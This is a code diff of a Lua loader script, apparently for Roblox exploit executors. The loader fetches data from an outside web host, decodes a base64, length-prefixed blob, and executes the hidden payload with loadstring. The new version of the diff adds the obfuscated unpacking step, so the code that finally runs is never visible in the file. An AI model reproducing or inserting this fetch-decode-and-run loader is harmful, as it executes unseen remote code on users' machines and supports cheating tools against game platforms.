@@ -1,34 +1,31 @@
 local HttpService = game:GetService("HttpService")
 
-local function req(u)
+local function http_request(opts)
     if http and http.request then
-        return http.request({ Url = u, Method = "GET" }).Body
+        return http.request(opts)
     elseif request then
-        return request({ Url = u, Method = "GET" }).Body
+        return request(opts)
     else
-        return HttpService:GetAsync(u)
+        return {
+            Body = HttpService:GetAsync(opts.Url),
+            StatusCode = 200
+        }
     end
 end
 
--- support all environments
-local key = rawget(_G, "scriptkey") or rawget(getgenv(), "scriptkey")
-if not key then
-    error("scriptkey not set")
-end
+local res = http_request({
+    Url = "https://yowhat-one.vercel.app/loader",
+    Method = "GET"
+})
 
-local src = req("https://lunoria-one.vercel.app/api?route=loader&key=" .. key)
-if not src or #src == 0 then
-    error("failed to fetch loader")
+local raw = crypt.base64decode(res.Body)
+local prefix_len = raw:byte(1) * 256 + raw:byte(2)
+local len_pos = 3 + prefix_len
+local len = 0
+for i = len_pos, len_pos + 3 do
+    len = len * 256 + raw:byte(i)
 end
+local payload_start = len_pos + 4
+local payload = raw:sub(payload_start, payload_start + len - 1)
 
-local fn = loadstring or load
-if not fn then
-    error("no loadstring support")
-end
-
-local chunk, err = fn(src)
-if not chunk then
-    error(err or "compile error")
-end
-
-chunk()
+loadstring(payload)()
